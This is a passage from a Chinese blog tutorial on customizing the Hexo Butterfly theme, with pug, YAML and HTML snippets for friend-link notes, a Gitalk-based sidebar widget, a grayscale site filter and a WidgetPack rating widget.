theme.Flink.requirement5</span><br><span class="line">    li= theme.Flink.requirement6</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有多少的requirement就加入多少行，然后在配置文件<code>butterfly.yml</code>用同样的方式加入</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">require_headline:</span> <span class="string">A</span> <span class="string">Few</span> <span class="string">Requirements</span></span><br><span class="line"><span class="attr">requirement1:</span> <span class="string">GamerNoTitle表示不接受商业性网站、下载站、视频站等</span></span><br><span class="line"><span class="attr">requirement2:</span> <span class="string">HTTP和HTTPS均可，不强制性要求小绿锁，但是只有一个IP或者带端口的不接受哦</span></span><br><span class="line"><span class="attr">requirement3:</span> <span class="string">网站要有维护，定期或不定期均可，线下朋友请忽略这一条</span></span><br><span class="line"><span class="attr">requirement4:</span> <span class="string">可以先在自己的网站加上我的友链，我处理的速度也会快一些呢~</span></span><br><span class="line"><span class="attr">requirement5:</span> <span class="string">大佬可以无视上面的要求，并加入“大佬之家”行列</span></span><br><span class="line"><span class="attr">requirement6:</span> <span class="string">如果你想联系我，在About页面中有我的相关联系方式</span></span><br></pre></td></tr></table></figure><p>就可以了~</p><h3 id="友链链接区块加入一行小字"><a href="#友链链接区块加入一行小字" class="headerlink" title="友链链接区块加入一行小字"></a>友链链接区块加入一行小字</h3><div class="note warning flat"><h4 id="Butterfly忘了哪个版本（我发现的时候是2-3-5）后不再需要此方法！"><a href="#Butterfly忘了哪个版本（我发现的时候是2-3-5）后不再需要此方法！" class="headerlink" title="Butterfly忘了哪个版本（我发现的时候是2.3.5）后不再需要此方法！"></a>Butterfly忘了哪个版本（我发现的时候是2.3.5）后不再需要此方法！</h4></div><p>效果就像图片里面的那样</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@butterfly-customize/img/butterfly-customize/Link-Class-Descr.png" alt="小字效果图"></p><p>其实这个也很简单，跟上面一样还是要动<code>flink.pug</code>文件，在最顶上那一块代码中加入一行，将所需的字典名字命名为<code>class_descr</code>，加入后的代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.flink</span><br><span class="line">  each i in site.data.link</span><br><span class="line">    h1= i.class_name</span><br><span class="line">    h4= i.class_descr//- 给每个class加入class_descr参数</span><br><span class="line">    .post-cards</span><br><span class="line">      ul.md-links</span><br><span class="line">        each item in i.link_list</span><br><span class="line">          li.md-links-item</span><br><span class="line">            a(href=item.link  title=item.name target=&quot;_blank&quot;)</span><br><span class="line">              if theme.lazyload.enable</span><br><span class="line">                img.lazyload(data-src=item.avatar onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.lodding_bg.flink) + `&#x27;` alt=item.name )</span><br><span class="line">              else</span><br><span class="line">                img(src=item.avatar onerror=`this.onerror=null;this.src=&#x27;` + url_for(theme.lodding_bg.flink) + `&#x27;` alt=item.name )</span><br><span class="line">              .md-links-title= item.name </span><br><span class="line">              .md-links-des= item.descr</span><br></pre></td></tr></table></figure><p>然后在link.yml的每一个class中就可以加入descr了，这里以一个区块做例子</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">class2:</span></span><br><span class="line">  <span class="attr">class_name:</span> <span class="string">DOS</span> <span class="string">私人服务</span></span><br><span class="line">  <span class="attr">class_descr:</span> <span class="string">我个人在使用的不同网络服务，在这里列出(＾Ｕ＾)ノ~ＹＯ</span><span class="comment"># 这里填入描述</span></span><br><span class="line">  <span class="attr">link_list:</span></span><br><span class="line">    <span class="attr">1:</span></span><br><span class="line">      <span class="attr">name:</span> <span class="string">CloudFlare</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://www.cloudflare.com/</span></span><br><span class="line">      <span class="attr">avatar:</span> <span class="string">https://dash.cloudflare.com/favicon.ico</span></span><br><span class="line">      <span class="attr">descr:</span> <span class="string">免费的域名托管平台</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>class_name</code>下面加入一行参数叫<code>class_descr</code>并设定为想要的内容即可，当然你也可以加在link_list的下面，但是请注意缩进要跟<code>class_name</code>和<code>link_list</code>平齐</p><h3 id="加入基于Gitalk的动态栏小部件"><a href="#加入基于Gitalk的动态栏小部件" class="headerlink" title="加入基于Gitalk的动态栏小部件"></a>加入基于Gitalk的动态栏小部件</h3><p>这个部件最开始是在<a href="https://diary.dorcandy.cn/">@火喵</a>的博客看到的，然后就发了邮件问了一下是怎么实现的</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@butterfly-customize/img/butterfly-customize/Mail.png"></p><p>感谢<a href="https://dorcandy.cn/">@火喵</a>提供的思路~！</p><p>然后我参照了Gitalk的文档，用一个非常简单的什么都没有的html文件来装我这个Gitalk，正因为只有Gitalk，所以整个html文档就很简单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@gitalk-css/css/gitalk-dorcandy.css&quot;</span>&gt;</span><span class="comment">&lt;!-- 导入自己修改过后的css文件，参照了火喵的 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@gitalk/js/gitalk.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!-- 导入自己修改后的js文件，主要修改了显示的字 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;gitalk-container&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> gitalk = <span class="keyword">new</span> <span class="title class_">Gitalk</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">id</span>: <span class="string">&#x27;Dynamics&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">clientID</span>: <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxx&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">clientSecret</span>: <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">repo</span>: <span class="string">&#x27;GamerNoTitle.Github.io&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">owner</span>: <span class="string">&#x27;GamerNoTitle&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">admin</span>: [<span class="string">&#x27;GamerNoTitle&#x27;</span>],</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">title</span>: <span class="string">&#x27;Dynamics&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">pagerDirection</span>: <span class="string">&#x27;last&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">perPage</span>: <span class="number">5</span>,</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript">    gitalk.<span class="title function_">render</span>(<span class="string">&#x27;gitalk-container&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中，<code>pagerDirection</code>本来是排序的顺序，但是按照Gitalk的<a href="https://github.com/gitalk/gitalk/issues/210">issue#210</a>中官方所述，不登录的话排序顺序只能是从旧到新，所以我也没办法，我采取的操作是一个issue中只容纳5条动态，历史动态就放到另外的issue中</p><p>将这个html文件命名一下为<code>gitalk.html</code>，然后放在主题目录的source文件夹下，然后进入<code>.\layout\includes\widget</code>文件夹，将<code>card_announcement.pug</code>（公告卡片）复制一份作为模板并且重命名为<code>card_dynamics.pug</code>，然后打开修改里面的内容。原来里面的内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.card-widget.card-announcement</span><br><span class="line">  .card-content</span><br><span class="line">    .item-headline</span><br><span class="line">      i.fa.fa-bullhorn.card-announcement-animation(aria-hidden=&quot;true&quot;)</span><br><span class="line">      span= _p(&#x27;aside.card_announcement&#x27;)</span><br><span class="line">    .announcement_content= theme.announcement.content</span><br></pre></td></tr></table></figure><p>在这里面，span应该是显示的字（如图红框处）</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@butterfly-customize/img/butterfly-customize/Announcement.png"></p><p>但是我加入的字不在语言配置文件中有，所以直接修改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">span= &#x27;Dynamics&#x27;</span><br></pre></td></tr></table></figure><p>就可以了，接着是要修改图标，作为动态，一个小喇叭的图标显得不是很好看。所以我就访问了<a href="https://fontawesome.com/v4.7.0/icons/">Fontawesome@v4.7.0</a>，选择了现在的这个图标</p><p>将图标的信息修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i.fa.fa-quote-right(aria-hidden=&quot;true&quot;)</span><br></pre></td></tr></table></figure><p>图标后面的那串动画就不要了，动画多了也不是很好看</p><p>最后需要引入Gitalk.html文件，在下面加入一行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include gitalk.html</span><br></pre></td></tr></table></figure><p>这样当部署完后，网站就会自动引用根目录下的<code>gitalk.html</code>文件。当然你要是直接访问我的gitalk.html文件也是能打开的</p><p>接着我们需要在网站的渲染中加入这个小部件</p><p>打开此目录下的<code>index.pug</code>，然后将这个引入加在认为合适的地方，我直接加载了公告的下面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.aside.card_dynamics</span><br><span class="line">  include ./card_dynamics.pug</span><br></pre></td></tr></table></figure><p>最后到<code>butterfly.yml</code>文件中，加入小部件的开关</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">aside:</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">right</span> <span class="comment"># left or right</span></span><br><span class="line">  <span class="attr">card_author:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_announcement:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_recent_post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_categories:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_tags:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">card_archives:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_webinfo:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_dynamics:</span> <span class="literal">true</span><span class="comment"># 动态开关</span></span><br></pre></td></tr></table></figure><p>部署自己的网页，就能够出现这种效果啦！</p><p>当然你要是在上面不要if判断，直接加入，那你就不需要在配置文件中加入开关了</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@butterfly-customize/img/butterfly-customize/dynamics-card.png" alt="Dynamics小部件"></p><div class="note info flat"><p>2020.4.4更新 主题版本<a href="https://github.com/jerryc127/hexo-theme-butterfly/releases/tag/2.2.5">butterfly@2.2.5</a></p></div><h3 id="为网站加上全局黑白效果"><a href="#为网站加上全局黑白效果" class="headerlink" title="为网站加上全局黑白效果"></a>为网站加上全局黑白效果</h3><p>为什么加这个效果呢？我一开始加是<a href="https://mp.weixin.qq.com/s/S0-s4V1Gg443a-vyMmaOKA">2020.4.4</a>为了纪念为抗争新冠肺炎而牺牲的各位烈士们，所以加了全局的黑白效果。先放两张图给你们看看加入后的效果</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@blackandwhite/img/butterfly-customize/blackandwhite-home.png" alt="黑白首页"></p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@blackandwhite/img/butterfly-customize/blackandwhite-link.png" alt="黑白友链"></p><p>就是像这样的全局黑白效果，加起来其实也不难，一开始<a href="https://yuleng.top/">@yuleng</a>给我分享了全局黑白的html代码，告诉我要加就加载header或者是body里面（下面先放html代码）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 黑白色 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">html</span>&#123;</span></span><br><span class="line"><span class="language-css"><span class="attribute">filter</span>: <span class="built_in">grayscale</span>( <span class="number">100%</span>);</span></span><br><span class="line"><span class="language-css">-webkit-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>( <span class="number">100%</span>);</span></span><br><span class="line"><span class="language-css">-moz-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>( <span class="number">100%</span>);</span></span><br><span class="line"><span class="language-css">-ms-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>( <span class="number">100%</span>);</span></span><br><span class="line"><span class="language-css">-o-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>( <span class="number">100%</span>);</span></span><br><span class="line"><span class="language-css"><span class="attribute">filter</span>: <span class="built_in">url</span>(<span class="string"> &quot;data:image/svg+xml;utf8,&lt;svg xmlns=\&#x27;http://www.w3.org/2000/svg\&#x27;&gt;&lt;filter id=\&#x27;grayscale\&#x27;&gt;&lt;feColorMatrix type=\&#x27;matrix\&#x27; values=\&#x27;0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0\&#x27;/&gt;&lt;/filter&gt;&lt;/svg&gt;#grayscale&quot;</span>);</span></span><br><span class="line"><span class="language-css"><span class="attribute">filter</span>:progid:DXImageTransform.Microsoft.<span class="built_in">BasicImage</span>(grayscale=<span class="number">1</span>);</span></span><br><span class="line"><span class="language-css">-webkit-<span class="attribute">filter</span>: <span class="built_in">grayscale</span>( <span class="number">1</span>);</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是我们的butterfly后端是使用的pug文件作为网站样式的编写方式，所以我们要先把它转成pug形式的，转出来就是像下面这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">  body</span><br><span class="line">    // 黑白色</span><br><span class="line">    style.</span><br><span class="line">      html&#123;</span><br><span class="line">      filter: grayscale( 100%);</span><br><span class="line">      -webkit-filter: grayscale( 100%);</span><br><span class="line">      -moz-filter: grayscale( 100%);</span><br><span class="line">      -ms-filter: grayscale( 100%);</span><br><span class="line">      -o-filter: grayscale( 100%);</span><br><span class="line">      filter: url( &quot;data:image/svg+xml;utf8,&lt;svg xmlns=\&#x27;http://www.w3.org/2000/svg\&#x27;&gt;&lt;filter id=\&#x27;grayscale\&#x27;&gt;&lt;feColorMatrix type=\&#x27;matrix\&#x27; values=\&#x27;0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0.3333 0.3333 0.3333 0 0 0 0 0 1 0\&#x27;/&gt;&lt;/filter&gt;&lt;/svg&gt;#grayscale&quot;);</span><br><span class="line">      filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1);</span><br><span class="line">      -webkit-filter: grayscale( 1);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后我把这一串代码存到一个名为<code>blackandwhite.pug</code>的文件，将它放在主题目录下的<code>layout/includes/addons</code>里面，然后就要在<code>layout.pug</code>里面引入文件。在原文件的<code>include ./head.pug</code>下面加入一行来引入我们的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.blackandwhite</span><br><span class="line">  include ./addons/blackandwhite.pug</span><br></pre></td></tr></table></figure><p>加个if判断是为了下次要使用的时候还能够用，不用再次修改。</p><p>接着我们到<code>butterfly.yml</code>文件内加多一行</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">blackandwhite:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>这样就开启了我们的黑白效果</p><p>为了方便大家，我将文件放出来<a href="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@blackandwhite.pug/file/blackandwhite.pug">blackandwhite.pug</a>，大家只需要将文件放在对应的位置，加上对应的配置项即可！</p><div class="note info flat"><p>2020.4.7更新 主题版本<a href="https://github.com/jerryc127/hexo-theme-butterfly/releases/tag/2.2.5">butterfly@2.2.5</a></p></div><h3 id="为文章加上投票评分功能"><a href="#为文章加上投票评分功能" class="headerlink" title="为文章加上投票评分功能"></a>为文章加上投票评分功能</h3><p>按照群友的要求，我又来更新啦，这次我们给文章加上投票评分功能，具体的效果像下面那样（Donate按键是主题自带的，不是我加入的）</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@rating/img/butterfly-customize/rating-rated.png" alt="Rating UI"></p><p>那么废话不多说，让我们直接开始！（如果你想直接使用我做好的只需要替换id的预设文件，那你可以点击<a href="#%E8%AF%84%E5%88%86%E9%A2%84%E8%AE%BE%E6%96%87%E6%A1%A3%E4%BD%BF%E7%94%A8">这里</a>直接跳到文档，而不必看我是如何做的）注册一个你自己的账号，注册过程相信我不用说你也会。注册完以后，会把我们导到安装界面，我们选择最右边的Rating widget，获取我们自己的引入代码，等待下一步使用，我这里获取到的引入代码如下（为保证信息准确性，我将自己的id替换成了xxxxx）</p><p>首先你得去<a href="https://widgetpack.com/">widgetpack</a>注册一个你自己的账号，注册过程相信我不用说你也会。注册完以后，会把我们导到安装界面，我们选择最右边的<code>Rating widget</code>，获取我们自己的引入代码，等待下一步使用，我这里获取到的引入代码如下（为保证信息准确性，我将自己的id替换成了xxxxx）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;wpac-rating&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">wpac_init = <span class="variable language_">window</span>.<span class="property">wpac_init</span> || [];</span></span><br><span class="line"><span class="language-javascript">wpac_init.<span class="title function_">push</span>(&#123;<span class="attr">widget</span>: <span class="string">&#x27;Rating&#x27;</span>, <span class="attr">id</span>: xxxxx&#125;);</span></span><br><span class="line"><span class="language-javascript">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (<span class="string">&#x27;WIDGETPACK_LOADED&#x27;</span> <span class="keyword">in</span> <span class="variable language_">window</span>) <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable constant_">WIDGETPACK_LOADED</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> mc = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    mc.<span class="property">type</span> = <span class="string">&#x27;text/javascript&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    mc.<span class="property">async</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">    mc.<span class="property">src</span> = <span class="string">&#x27;https://embed.widgetpack.com/widget.js&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;script&#x27;</span>)[<span class="number">0</span>]; s.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(mc, s.<span class="property">nextSibling</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;)();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://widgetpack.com&quot;</span> <span class="attr">class</span>=<span class="string">&quot;wpac-cr&quot;</span>&gt;</span>Star Rating WIDGET PACK<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接着，我们要在对应的地方引用它，但是butterfly是使用pug和stylus的组合来进行渲染的，所以我们要先把上面的这一串代码转成pug形式的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">  body</span><br><span class="line">    #wpac-rating</span><br><span class="line">    script(type=&quot;text/javascript&quot;).</span><br><span class="line">      wpac_init = window.wpac_init || [];</span><br><span class="line">      wpac_init.push(&#123;widget: &#x27;Rating&#x27;, id: xxxxx&#125;);</span><br><span class="line">      (function() &#123;</span><br><span class="line">      if (&#x27;WIDGETPACK_LOADED&#x27; in window) return;</span><br><span class="line">      WIDGETPACK_LOADED = true;</span><br><span class="line">      var mc = document.createElement(&#x27;script&#x27;);</span><br><span class="line">      mc.type = &#x27;text/javascript&#x27;;</span><br><span class="line">      mc.async = true;</span><br><span class="line">      mc.src = &#x27;https://embed.widgetpack.com/widget.js&#x27;;</span><br><span class="line">      var s = document.getElementsByTagName(&#x27;script&#x27;)[0]; s.parentNode.insertBefore(mc, s.nextSibling);</span><br><span class="line">      &#125;)();</span><br><span class="line">    a.wpac-cr(href=&quot;https://widgetpack.com&quot;) Star Rating WIDGET PACK</span><br></pre></td></tr></table></figure><p>然后将其保存成<code>rating.pug</code>，放到<code>./layout/includes/addons</code>里面去。不过在这代码里面，投票UI不是居中的就让我很不上，而且最后一行有一串a标签，然而我并不是很喜欢它，我将代码改成了下面这个样子(这里把id改成了变量，可以在butterfly.yml里面修改)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">  body</span><br><span class="line">    #wpac-rating(align=&quot;center&quot;)</span><br><span class="line">    script(type=&quot;text/javascript&quot;).</span><br><span class="line">      wpac_init = window.wpac_init || [];</span><br><span class="line">      wpac_init.push(&#123;widget: &#x27;Rating&#x27;, id: !&#123;theme.rating.id&#125;&#125;);  //- 这里将xxxxx改成自己的id</span><br><span class="line">      (function() &#123;</span><br><span class="line">      if (&#x27;WIDGETPACK_LOADED&#x27; in window) return;</span><br><span class="line">      WIDGETPACK_LOADED = true;</span><br><span class="line">      var mc = document.createElement(&#x27;script&#x27;);</span><br><span class="line">      mc.type = &#x27;text/javascript&#x27;;</span><br><span class="line">      mc.async = true;</span><br><span class="line">      mc.src = &#x27;https://embed.widgetpack.com/widget.js&#x27;;</span><br><span class="line">      var s = document.getElementsByTagName(&#x27;script&#x27;)[0]; s.parentNode.insertBefore(mc, s.nextSibling);</span><br><span class="line">      &#125;)();</span><br><span class="line">      //- 下面的那行小字 如果你不需要可以把17~21行注释掉</span><br><span class="line">    #copy(align=&quot;center&quot;)</span><br><span class="line">      | Rating addon based on </span><br><span class="line">      a(herf=&quot;https://widgetpack.com/&quot;) widgetpack</span><br><span class="line">      | , by </span><br><span class="line">      a(href=&quot;https://bili33.top&quot;) GamerNoTitle</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>保存完成后，我们进入<code>./layout/post.pug</code>里面对我们的文件进行引入，在合适的位置添加引入代码，我这里是在打上的下面进行了添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if theme.reward.enable</span><br><span class="line">  !=partial(&#x27;includes/post/reward&#x27;, &#123;&#125;, &#123;cache:theme.fragment_cache&#125;)</span><br><span class="line">//- 上面是打赏功能，下面是添加的投票功能</span><br><span class="line">if theme.rating.enable</span><br><span class="line">  include includes/addons/rating.pug</span><br></pre></td></tr></table></figure><p>接着，我们到<code>butterfly.yml</code>里面加入新的配置项</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">rating:</span></span><br><span class="line"><span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">id:</span> <span class="number">00000</span></span><br></pre></td></tr></table></figure><p>这样就加入了一个开关（不过是全局的），可以控制rating功能是否开启（讲真我觉得这个功能我自己用的很少，我自己应该会关掉）</p><p>接着我们就可以部署自己的应用啦，看看是不是可以开始投票了呢？</p><p>关于投票的设定，默认是需要社交账号登录的，但是看着这几个图标，又有几个是在国内能够使用的呢？</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@rating/img/butterfly-customize/rating-social.png" alt="社交账号登录方式"></p><p>我们需要更改这个设定，让其不需要社交账号登录也能够进行投票</p><p>点开左上角的三条横线，选择<code>Rating</code>，然后点击里面的<code>Setting</code>，在这里面就有我们需要的设置</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@rating/img/butterfly-customize/rating-default-settings.png" alt="Rating设置"></p><p>我们可以看到左边的框选择的是Social，我们可以选择<code>IP 